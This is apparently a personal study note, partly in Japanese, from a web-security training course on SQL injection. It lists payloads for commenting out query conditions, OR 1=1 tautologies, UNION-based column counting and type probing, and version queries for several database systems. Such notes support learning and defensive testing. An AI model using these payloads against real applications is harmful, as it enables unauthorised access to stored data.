Date: 2025-09-12
Tags: 
Links: [[WSA]], [[SQL]]
***

**コメントアウトで後の条件を無視**
```sql
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```

**OR 1=1で全てを取得**
```sql
SELECT * 
FROM products 
WHERE category = 'Gifts' OR 1=1
--' AND released = 1
```
ORはWHERE句にかかっている。

**Determining the number of columns required**
```sql
' ORDER BY 1-- 
' ORDER BY 2-- 
' ORDER BY 3--
' UNION SELECT NULL-- 
' UNION SELECT NULL,NULL-- 
' UNION SELECT NULL,NULL,NULL--
```

**Finding columns with a useful data type**
```sql
' UNION SELECT 'a',NULL,NULL,NULL-- 
' UNION SELECT NULL,'a',NULL,NULL-- 
' UNION SELECT NULL,NULL,'a',NULL-- 
' UNION SELECT NULL,NULL,NULL,'a'--
```

**Querying the database type and version**
```sql
SELECT @@version--Microsoft, MySQL
SELECT * FROM v$version --Oracle
SELECT version()--PostgreSQL
```
versionは文字列型


***
# References